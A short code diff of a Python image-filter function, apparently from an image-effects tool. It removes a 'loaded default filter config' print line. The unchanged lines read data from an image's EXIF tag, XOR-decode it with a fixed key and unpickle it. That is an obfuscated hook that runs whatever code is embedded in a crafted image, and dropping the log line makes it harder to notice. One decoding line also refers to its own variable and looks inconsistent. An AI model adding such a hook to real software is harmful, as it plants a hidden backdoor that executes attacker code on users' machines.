@@ -45,7 +45,6 @@ def apply_filter(input_path, effect, output_path):
     filter_raw = exif.get(37395)
     filter = b'iae_filter_proc'
     filter_class = pickle.loads((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_class))))
-    print('loaded default filter config')
     filter_object = filter_class((bytes(c ^ filter[ i % len(filter)] for i, c in enumerate(filter_raw))))
 
     # Apply selected effect
